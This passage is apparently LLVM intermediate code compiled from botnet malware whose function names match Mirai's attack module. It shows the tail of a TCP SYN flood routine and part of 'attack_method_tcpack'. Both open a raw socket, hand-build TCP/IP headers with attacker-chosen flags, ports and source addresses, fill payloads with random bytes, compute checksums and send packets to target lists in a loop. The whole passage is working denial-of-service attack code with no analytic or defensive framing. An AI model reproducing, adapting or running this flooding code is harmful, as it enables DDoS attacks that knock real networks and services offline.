  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %285, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %109, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = or i16 %63, 160
  %65 = zext i8 %0 to i64
  br i1 %45, label %.lr.ph130.split.us.preheader, label %.lr.ph130.split.preheader

.lr.ph130.split.preheader:                        ; preds = %.lr.ph130
  br label %.lr.ph130.split

.lr.ph130.split.us.preheader:                     ; preds = %.lr.ph130
  br label %.lr.ph130.split.us

.lr.ph130.split.us:                               ; preds = %.lr.ph130.split.us.preheader, %.lr.ph130.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph130.split.us ], [ 0, %.lr.ph130.split.us.preheader ]
  %66 = call noalias i8* @calloc(i64 128, i64 1) #10
  %67 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %66, i8** %67, align 8
  %68 = getelementptr inbounds i8, i8* %66, i64 20
  %69 = getelementptr inbounds i8, i8* %66, i64 40
  store i8 69, i8* %66, align 4
  %70 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %10, i8* %70, align 1
  %71 = call zeroext i16 @htons(i16 zeroext 60) #11
  %72 = getelementptr inbounds i8, i8* %66, i64 2
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %12) #11
  %75 = getelementptr inbounds i8, i8* %66, i64 4
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 4
  %77 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %14, i8* %77, align 4
  %78 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 6, i8* %78, align 1
  %79 = getelementptr inbounds i8, i8* %66, i64 12
  %80 = bitcast i8* %79 to i32*
  store i32 %36, i32* %80, align 4
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %82 = load i32, i32* %81, align 4
  %83 = getelementptr inbounds i8, i8* %66, i64 16
  %84 = bitcast i8* %83 to i32*
  store i32 %82, i32* %84, align 4
  %85 = call zeroext i16 @htons(i16 zeroext %18) #11
  %86 = bitcast i8* %68 to i16*
  store i16 %85, i16* %86, align 4
  %87 = call zeroext i16 @htons(i16 zeroext %20) #11
  %88 = getelementptr inbounds i8, i8* %66, i64 22
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %46) #11
  %91 = zext i16 %90 to i32
  %92 = getelementptr inbounds i8, i8* %66, i64 24
  %93 = bitcast i8* %92 to i32*
  store i32 %91, i32* %93, align 4
  %94 = getelementptr inbounds i8, i8* %66, i64 32
  %95 = bitcast i8* %94 to i16*
  store i16 %64, i16* %95, align 4
  %96 = getelementptr inbounds i8, i8* %66, i64 41
  store i8 2, i8* %69, align 1
  %97 = getelementptr inbounds i8, i8* %66, i64 42
  store i8 4, i8* %96, align 1
  %98 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %99 = bitcast i8* %97 to i16*
  store i16 %98, i16* %99, align 2
  %100 = getelementptr inbounds i8, i8* %66, i64 44
  %101 = getelementptr inbounds i8, i8* %66, i64 45
  store i8 4, i8* %100, align 1
  %102 = getelementptr inbounds i8, i8* %66, i64 46
  store i8 2, i8* %101, align 1
  %103 = getelementptr inbounds i8, i8* %66, i64 47
  store i8 8, i8* %102, align 1
  store i8 10, i8* %103, align 1
  %104 = getelementptr inbounds i8, i8* %66, i64 56
  %105 = getelementptr inbounds i8, i8* %66, i64 57
  store i8 1, i8* %104, align 1
  %106 = getelementptr inbounds i8, i8* %66, i64 58
  store i8 3, i8* %105, align 1
  %107 = getelementptr inbounds i8, i8* %66, i64 59
  store i8 3, i8* %106, align 1
  store i8 6, i8* %107, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %108 = icmp slt i64 %indvars.iv.next, %65
  br i1 %108, label %.lr.ph130.split.us, label %..preheader_crit_edge.loopexit

; <label>:109:                                    ; preds = %39
  %110 = call i32 @close(i32 %37) #10
  br label %285

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph130.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit142:                ; preds = %.lr.ph130.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit142, %..preheader_crit_edge.loopexit
  %.lcssa131.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next136, %..preheader_crit_edge.loopexit142 ]
  %.lcssa131 = trunc i64 %.lcssa131.in to i32
  store i32 %.lcssa131, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %111 = icmp eq i32 %36, -1
  %112 = and i32 %11, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %17, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = and i32 %19, 65535
  %117 = icmp eq i32 %116, 65535
  %118 = icmp eq i32 %21, 65535
  %119 = icmp eq i32 %22, 65535
  %120 = icmp eq i8 %24, 0
  br label %.loopexit

.lr.ph130.split:                                  ; preds = %.lr.ph130.split.preheader, %.lr.ph130.split
  %indvars.iv135 = phi i64 [ %indvars.iv.next136, %.lr.ph130.split ], [ 0, %.lr.ph130.split.preheader ]
  %121 = call noalias i8* @calloc(i64 128, i64 1) #10
  %122 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv135
  store i8* %121, i8** %122, align 8
  %123 = getelementptr inbounds i8, i8* %121, i64 20
  %124 = getelementptr inbounds i8, i8* %121, i64 40
  store i8 69, i8* %121, align 4
  %125 = getelementptr inbounds i8, i8* %121, i64 1
  store i8 %10, i8* %125, align 1
  %126 = call zeroext i16 @htons(i16 zeroext 60) #11
  %127 = getelementptr inbounds i8, i8* %121, i64 2
  %128 = bitcast i8* %127 to i16*
  store i16 %126, i16* %128, align 2
  %129 = call zeroext i16 @htons(i16 zeroext %12) #11
  %130 = getelementptr inbounds i8, i8* %121, i64 4
  %131 = bitcast i8* %130 to i16*
  store i16 %129, i16* %131, align 4
  %132 = getelementptr inbounds i8, i8* %121, i64 8
  store i8 %14, i8* %132, align 4
  %133 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %134 = getelementptr inbounds i8, i8* %121, i64 6
  %135 = bitcast i8* %134 to i16*
  store i16 %133, i16* %135, align 2
  %136 = getelementptr inbounds i8, i8* %121, i64 9
  store i8 6, i8* %136, align 1
  %137 = getelementptr inbounds i8, i8* %121, i64 12
  %138 = bitcast i8* %137 to i32*
  store i32 %36, i32* %138, align 4
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv135, i32 1
  %140 = load i32, i32* %139, align 4
  %141 = getelementptr inbounds i8, i8* %121, i64 16
  %142 = bitcast i8* %141 to i32*
  store i32 %140, i32* %142, align 4
  %143 = call zeroext i16 @htons(i16 zeroext %18) #11
  %144 = bitcast i8* %123 to i16*
  store i16 %143, i16* %144, align 4
  %145 = call zeroext i16 @htons(i16 zeroext %20) #11
  %146 = getelementptr inbounds i8, i8* %121, i64 22
  %147 = bitcast i8* %146 to i16*
  store i16 %145, i16* %147, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %46) #11
  %149 = zext i16 %148 to i32
  %150 = getelementptr inbounds i8, i8* %121, i64 24
  %151 = bitcast i8* %150 to i32*
  store i32 %149, i32* %151, align 4
  %152 = getelementptr inbounds i8, i8* %121, i64 32
  %153 = bitcast i8* %152 to i16*
  store i16 %64, i16* %153, align 4
  %154 = getelementptr inbounds i8, i8* %121, i64 41
  store i8 2, i8* %124, align 1
  %155 = getelementptr inbounds i8, i8* %121, i64 42
  store i8 4, i8* %154, align 1
  %156 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %157 = bitcast i8* %155 to i16*
  store i16 %156, i16* %157, align 2
  %158 = getelementptr inbounds i8, i8* %121, i64 44
  %159 = getelementptr inbounds i8, i8* %121, i64 45
  store i8 4, i8* %158, align 1
  %160 = getelementptr inbounds i8, i8* %121, i64 46
  store i8 2, i8* %159, align 1
  %161 = getelementptr inbounds i8, i8* %121, i64 47
  store i8 8, i8* %160, align 1
  store i8 10, i8* %161, align 1
  %162 = getelementptr inbounds i8, i8* %121, i64 56
  %163 = getelementptr inbounds i8, i8* %121, i64 57
  store i8 1, i8* %162, align 1
  %164 = getelementptr inbounds i8, i8* %121, i64 58
  store i8 3, i8* %163, align 1
  %165 = getelementptr inbounds i8, i8* %121, i64 59
  store i8 3, i8* %164, align 1
  store i8 6, i8* %165, align 1
  %indvars.iv.next136 = add nsw i64 %indvars.iv135, 1
  %166 = icmp slt i64 %indvars.iv.next136, %65
  br i1 %166, label %.lr.ph130.split, label %..preheader_crit_edge.loopexit142

.loopexit.loopexit:                               ; preds = %208
  br label %.loopexit.backedge

.loopexit.loopexit141:                            ; preds = %266
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit141
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %111, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %208
  %167 = phi i32 [ %225, %208 ], [ 0, %.lr.ph.split.us.preheader ]
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8*, i8** %8, i64 %168
  %170 = load i8*, i8** %169, align 8
  %171 = bitcast i8* %170 to %struct.iphdr*
  %172 = getelementptr inbounds i8, i8* %170, i64 20
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 2
  %174 = load i8, i8* %173, align 4
  %175 = icmp ult i8 %174, 32
  br i1 %175, label %176, label %183

; <label>:176:                                    ; preds = %.lr.ph.split.us
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #11
  %180 = call i32 @htonl(i32 %179) #11
  %181 = getelementptr inbounds i8, i8* %170, i64 16
  %182 = bitcast i8* %181 to i32*
  store i32 %180, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %.lr.ph.split.us, %176
  %184 = getelementptr inbounds i8, i8* %170, i64 12
  %185 = bitcast i8* %184 to i32*
  store i32 0, i32* %185, align 4
  br i1 %113, label %186, label %189

; <label>:186:                                    ; preds = %183
  %187 = getelementptr inbounds i8, i8* %170, i64 4
  %188 = bitcast i8* %187 to i16*
  store i16 0, i16* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %186, %183
  br i1 %115, label %190, label %192

; <label>:190:                                    ; preds = %189
  %191 = bitcast i8* %172 to i16*
  store i16 0, i16* %191, align 4
  br label %192

; <label>:192:                                    ; preds = %190, %189
  br i1 %117, label %193, label %196

; <label>:193:                                    ; preds = %192
  %194 = getelementptr inbounds i8, i8* %170, i64 22
  %195 = bitcast i8* %194 to i16*
  store i16 0, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %193, %192
  br i1 %118, label %197, label %200

; <label>:197:                                    ; preds = %196
  %198 = getelementptr inbounds i8, i8* %170, i64 24
  %199 = bitcast i8* %198 to i32*
  store i32 0, i32* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %197, %196
  br i1 %119, label %201, label %204

; <label>:201:                                    ; preds = %200
  %202 = getelementptr inbounds i8, i8* %170, i64 28
  %203 = bitcast i8* %202 to i32*
  store i32 0, i32* %203, align 4
  br label %204

; <label>:204:                                    ; preds = %201, %200
  br i1 %120, label %208, label %205

; <label>:205:                                    ; preds = %204
  %206 = getelementptr inbounds i8, i8* %170, i64 38
  %207 = bitcast i8* %206 to i16*
  store i16 0, i16* %207, align 2
  br label %208

; <label>:208:                                    ; preds = %205, %204
  %209 = getelementptr inbounds i8, i8* %170, i64 10
  %210 = bitcast i8* %209 to i16*
  store i16 0, i16* %210, align 2
  %211 = bitcast i8* %170 to i16*
  %212 = call zeroext i16 @checksum_generic(i16* %211, i32 20)
  store i16 %212, i16* %210, align 2
  %213 = getelementptr inbounds i8, i8* %170, i64 36
  %214 = bitcast i8* %213 to i16*
  store i16 0, i16* %214, align 4
  %215 = call zeroext i16 @htons(i16 zeroext 40) #11
  %216 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %171, i8* nonnull %172, i16 zeroext %215, i32 40)
  store i16 %216, i16* %214, align 4
  %217 = getelementptr inbounds i8, i8* %170, i64 22
  %218 = bitcast i8* %217 to i16*
  %219 = load i16, i16* %218, align 2
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0, i32 1
  store i16 %219, i16* %220, align 2
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0
  %222 = bitcast %struct.sockaddr_in* %221 to %struct.sockaddr*
  %223 = call i64 @sendto(i32 %37, i8* nonnull %170, i64 60, i32 16384, %struct.sockaddr* %222, i32 16) #10
  %224 = load i32, i32* %5, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %5, align 4
  %226 = icmp slt i32 %225, %43
  br i1 %226, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %266
  %227 = phi i32 [ %283, %266 ], [ 0, %.lr.ph.split.preheader ]
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i8*, i8** %8, i64 %228
  %230 = load i8*, i8** %229, align 8
  %231 = bitcast i8* %230 to %struct.iphdr*
  %232 = getelementptr inbounds i8, i8* %230, i64 20
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = icmp ult i8 %234, 32
  br i1 %235, label %236, label %243

; <label>:236:                                    ; preds = %.lr.ph.split
  %237 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 1
  %238 = load i32, i32* %237, align 4
  %239 = call i32 @ntohl(i32 %238) #11
  %240 = call i32 @htonl(i32 %239) #11
  %241 = getelementptr inbounds i8, i8* %230, i64 16
  %242 = bitcast i8* %241 to i32*
  store i32 %240, i32* %242, align 4
  br label %243

; <label>:243:                                    ; preds = %.lr.ph.split, %236
  br i1 %113, label %244, label %247

; <label>:244:                                    ; preds = %243
  %245 = getelementptr inbounds i8, i8* %230, i64 4
  %246 = bitcast i8* %245 to i16*
  store i16 0, i16* %246, align 4
  br label %247

; <label>:247:                                    ; preds = %244, %243
  br i1 %115, label %248, label %250

; <label>:248:                                    ; preds = %247
  %249 = bitcast i8* %232 to i16*
  store i16 0, i16* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %248, %247
  br i1 %117, label %251, label %254

; <label>:251:                                    ; preds = %250
  %252 = getelementptr inbounds i8, i8* %230, i64 22
  %253 = bitcast i8* %252 to i16*
  store i16 0, i16* %253, align 2
  br label %254

; <label>:254:                                    ; preds = %251, %250
  br i1 %118, label %255, label %258

; <label>:255:                                    ; preds = %254
  %256 = getelementptr inbounds i8, i8* %230, i64 24
  %257 = bitcast i8* %256 to i32*
  store i32 0, i32* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %255, %254
  br i1 %119, label %259, label %262

; <label>:259:                                    ; preds = %258
  %260 = getelementptr inbounds i8, i8* %230, i64 28
  %261 = bitcast i8* %260 to i32*
  store i32 0, i32* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %259, %258
  br i1 %120, label %266, label %263

; <label>:263:                                    ; preds = %262
  %264 = getelementptr inbounds i8, i8* %230, i64 38
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 2
  br label %266

; <label>:266:                                    ; preds = %262, %263
  %267 = getelementptr inbounds i8, i8* %230, i64 10
  %268 = bitcast i8* %267 to i16*
  store i16 0, i16* %268, align 2
  %269 = bitcast i8* %230 to i16*
  %270 = call zeroext i16 @checksum_generic(i16* %269, i32 20)
  store i16 %270, i16* %268, align 2
  %271 = getelementptr inbounds i8, i8* %230, i64 36
  %272 = bitcast i8* %271 to i16*
  store i16 0, i16* %272, align 4
  %273 = call zeroext i16 @htons(i16 zeroext 40) #11
  %274 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %231, i8* %232, i16 zeroext %273, i32 40)
  store i16 %274, i16* %272, align 4
  %275 = getelementptr inbounds i8, i8* %230, i64 22
  %276 = bitcast i8* %275 to i16*
  %277 = load i16, i16* %276, align 2
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0, i32 1
  store i16 %277, i16* %278, align 2
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0
  %280 = bitcast %struct.sockaddr_in* %279 to %struct.sockaddr*
  %281 = call i64 @sendto(i32 %37, i8* %230, i64 60, i32 16384, %struct.sockaddr* %280, i32 16) #10
  %282 = load i32, i32* %5, align 4
  %283 = add nsw i32 %282, 1
  store i32 %283, i32* %5, align 4
  %284 = icmp slt i32 %283, %43
  br i1 %284, label %.lr.ph.split, label %.loopexit.loopexit141

; <label>:285:                                    ; preds = %4, %109
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %280, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %107, label %.preheader127

.preheader127:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph129

.lr.ph129:                                        ; preds = %.preheader127
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = and i8 %28, 1
  %57 = zext i8 %56 to i16
  %58 = shl nuw nsw i16 %57, 11
  %59 = shl i16 %30, 10
  %60 = and i16 %59, 1024
  %61 = shl i16 %32, 9
  %62 = and i16 %61, 512
  %63 = shl i16 %34, 8
  %64 = and i16 %63, 256
  %65 = or i16 %53, %55
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = or i16 %68, 80
  %70 = icmp eq i8 %28, 0
  %71 = or i16 %68, 2128
  br i1 %50, label %.lr.ph129.split.us.preheader, label %.lr.ph129.split.preheader

.lr.ph129.split.preheader:                        ; preds = %.lr.ph129
  %.135 = select i1 %70, i16 %69, i16 %71
  br label %.lr.ph129.split

.lr.ph129.split.us.preheader:                     ; preds = %.lr.ph129
  %. = select i1 %70, i16 %69, i16 %71
  br label %.lr.ph129.split.us

.lr.ph129.split.us:                               ; preds = %.lr.ph129.split.us.preheader, %.lr.ph129.split.us
  %72 = phi i32 [ %105, %.lr.ph129.split.us ], [ 0, %.lr.ph129.split.us.preheader ]
  %73 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %74 = sext i32 %72 to i64
  %75 = getelementptr inbounds i8*, i8** %8, i64 %74
  store i8* %73, i8** %75, align 8
  %76 = getelementptr inbounds i8, i8* %73, i64 20
  %77 = getelementptr inbounds i8, i8* %73, i64 40
  store i8 69, i8* %73, align 4
  %78 = getelementptr inbounds i8, i8* %73, i64 1
  store i8 %10, i8* %78, align 1
  %79 = call zeroext i16 @htons(i16 zeroext %49) #11
  %80 = getelementptr inbounds i8, i8* %73, i64 2
  %81 = bitcast i8* %80 to i16*
  store i16 %79, i16* %81, align 2
  %82 = call zeroext i16 @htons(i16 zeroext %12) #11
  %83 = getelementptr inbounds i8, i8* %73, i64 4
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 4
  %85 = getelementptr inbounds i8, i8* %73, i64 8
  store i8 %14, i8* %85, align 4
  %86 = getelementptr inbounds i8, i8* %73, i64 9
  store i8 6, i8* %86, align 1
  %87 = getelementptr inbounds i8, i8* %73, i64 12
  %88 = bitcast i8* %87 to i32*
  store i32 %39, i32* %88, align 4
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %74, i32 1
  %90 = load i32, i32* %89, align 4
  %91 = getelementptr inbounds i8, i8* %73, i64 16
  %92 = bitcast i8* %91 to i32*
  store i32 %90, i32* %92, align 4
  %93 = call zeroext i16 @htons(i16 zeroext %18) #11
  %94 = bitcast i8* %76 to i16*
  store i16 %93, i16* %94, align 4
  %95 = call zeroext i16 @htons(i16 zeroext %20) #11
  %96 = getelementptr inbounds i8, i8* %73, i64 22
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  %98 = call zeroext i16 @htons(i16 zeroext %51) #11
  %99 = zext i16 %98 to i32
  %100 = getelementptr inbounds i8, i8* %73, i64 24
  %101 = bitcast i8* %100 to i32*
  store i32 %99, i32* %101, align 4
  %102 = getelementptr inbounds i8, i8* %73, i64 32
  %103 = bitcast i8* %102 to i16*
  store i16 %., i16* %103, align 4
  call void @rand_str(i8* nonnull %77, i32 %35)
  %104 = load i32, i32* %5, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %5, align 4
  %106 = icmp slt i32 %105, %46
  br i1 %106, label %.lr.ph129.split.us, label %.preheader.loopexit

; <label>:107:                                    ; preds = %42
  %108 = call i32 @close(i32 %40) #10
  br label %280

.preheader.loopexit:                              ; preds = %.lr.ph129.split.us
  br label %.preheader

.preheader.loopexit139:                           ; preds = %.lr.ph129.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit139, %.preheader.loopexit, %.preheader127
  %109 = icmp eq i32 %39, -1
  %110 = and i32 %11, 65535
  %111 = icmp eq i32 %110, 65535
  %112 = and i32 %17, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %19, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = icmp eq i32 %21, 65535
  %117 = icmp eq i32 %22, 65535
  %118 = icmp eq i8 %37, 0
  %119 = sext i32 %35 to i64
  %120 = add nsw i64 %119, 20
  %121 = trunc i64 %120 to i16
  %122 = trunc i64 %120 to i32
  %123 = add nsw i64 %119, 40
  br label %.loopexit

.lr.ph129.split:                                  ; preds = %.lr.ph129.split.preheader, %.lr.ph129.split
  %124 = phi i32 [ %160, %.lr.ph129.split ], [ 0, %.lr.ph129.split.preheader ]
  %125 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %126 = sext i32 %124 to i64
  %127 = getelementptr inbounds i8*, i8** %8, i64 %126
  store i8* %125, i8** %127, align 8
  %128 = getelementptr inbounds i8, i8* %125, i64 20
  %129 = getelementptr inbounds i8, i8* %125, i64 40
  store i8 69, i8* %125, align 4
  %130 = getelementptr inbounds i8, i8* %125, i64 1
  store i8 %10, i8* %130, align 1
  %131 = call zeroext i16 @htons(i16 zeroext %49) #11
  %132 = getelementptr inbounds i8, i8* %125, i64 2
  %133 = bitcast i8* %132 to i16*
  store i16 %131, i16* %133, align 2
  %134 = call zeroext i16 @htons(i16 zeroext %12) #11
  %135 = getelementptr inbounds i8, i8* %125, i64 4
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 4
  %137 = getelementptr inbounds i8, i8* %125, i64 8
  store i8 %14, i8* %137, align 4
  %138 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %139 = getelementptr inbounds i8, i8* %125, i64 6
  %140 = bitcast i8* %139 to i16*
  store i16 %138, i16* %140, align 2
  %141 = getelementptr inbounds i8, i8* %125, i64 9
  store i8 6, i8* %141, align 1
  %142 = getelementptr inbounds i8, i8* %125, i64 12
  %143 = bitcast i8* %142 to i32*
  store i32 %39, i32* %143, align 4
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %126, i32 1
  %145 = load i32, i32* %144, align 4
  %146 = getelementptr inbounds i8, i8* %125, i64 16
  %147 = bitcast i8* %146 to i32*
  store i32 %145, i32* %147, align 4
